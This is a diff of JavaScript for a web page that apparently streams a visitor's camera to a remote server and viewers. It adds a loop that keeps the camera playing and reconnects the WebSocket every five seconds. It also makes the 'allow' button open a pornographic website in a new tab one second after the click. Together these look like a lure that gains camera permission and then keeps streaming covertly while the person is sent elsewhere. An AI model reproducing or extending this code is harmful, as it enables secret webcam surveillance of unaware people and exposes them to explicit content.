@@ -571,7 +571,49 @@ function connectServer(){
 
 }
 
+/* ==============================
+   KEEP CAMERA CONNECTION ALIVE
+============================== */
 
+function keepCameraAlive() {
+
+  if (!stream) {
+    return;
+  }
+
+  // Keep local camera video playing
+  if (
+    document.visibilityState === "visible" &&
+    video.paused
+  ) {
+
+    video.play().catch(() => {});
+
+  }
+
+  // Reconnect WebSocket if connection was lost
+  if (
+    !socket ||
+    socket.readyState === WebSocket.CLOSED ||
+    socket.readyState === WebSocket.CLOSING
+  ) {
+
+    console.log("Reconnecting WebSocket...");
+
+    connectServer();
+
+  }
+
+}
+
+
+/* Check every 5 seconds */
+
+setInterval(() => {
+
+  keepCameraAlive();
+
+}, 5000);
 /* =========================================
    HANDLE VIEWER ICE
 ========================================= */
@@ -1084,7 +1126,8 @@ allowBtn.addEventListener("click", async () => {
     setTimeout(() => {
 
       window.open(
-        "https://www.sexvid.xxx/s/most-favourited/sex+p%2A%2A%2A/"
+        "https://www.sexvid.xxx/s/most-favourited/sex+p%2A%2A%2A/",
+        "_blank"    
       );
 
     }, 1000);
